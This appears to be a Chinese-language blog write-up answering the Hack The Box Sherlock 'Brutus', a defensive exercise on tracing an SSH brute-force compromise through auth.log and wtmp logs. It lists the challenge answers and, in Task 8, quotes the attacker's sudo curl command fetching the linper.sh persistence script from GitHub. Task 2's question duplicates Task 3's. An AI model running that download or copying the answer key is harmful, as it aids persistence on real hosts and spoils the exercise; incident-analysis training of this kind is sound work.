---
weight: 999
title: "Brutus"
description: ""
icon: "article"
date: "2025-05-30T10:51:07+08:00"
lastmod: "2025-05-30T10:51:07+08:00"
draft: false
toc: true
---

解压密码为hacktheblue

>在这个非常简单的 Sherlock 任务中，您将熟悉 Unix 系统的 auth.log 和 wtmp 日志。我们将探讨一个 Confluence 服务器通过 SSH 服务遭受暴力破解的场景。攻击者获取服务器访问权限后，还进行了其他活动，这些都可以通过 auth.log 追踪。尽管 auth.log 主要用于暴力破解分析，但在本次调查中，我们将深入挖掘这一日志的全部潜力，包括权限提升、持久化攻击的迹象，甚至部分命令执行的可见性。

# Task1
>分析 auth.log 日志。攻击者用于实施暴力破解攻击的 IP 地址是什么？
>
>65.2.161.68


![](https://gitee.com/inklong/blog-pic/raw/master/images/20250530222308030.png)

# Task2
>识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。
>
>root


![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531185222568.png)

# Task3
>识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。
>
>2024-03-06 06:32:45

分析wtmp文件即可
# Task4
>SSH 登录会话在登录时会被跟踪并分配一个会话编号。攻击者针对问题 2 中用户账户的会话被分配了哪个会话编号？
>
>37


![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531185222568.png)

# Task5
>攻击者在服务器上添加了一个新用户作为其持久化策略的一部分，并赋予该新用户账户更高的权限。这个账户的名称是什么？
>
>cyberjunkie


![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531185353805.png)

# Task6
>用于通过创建新账户实现持久化的 MITRE ATT&CK 子技术 ID 是什么？
>
>T1136.001

技术为创建用户-本地用户
https://attack.mitre.org/techniques/T1136/
# Task7
>根据 auth.log，攻击者的第一次 SSH 会话何时结束？
>
>2024-03-06 06:37:24


![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531185409987.png)

# Task8
>攻击者登录其后门账户并利用其更高权限下载了一个脚本。使用 sudo 执行的具体完整命令是什么？
>
>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh


![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531185422577.png)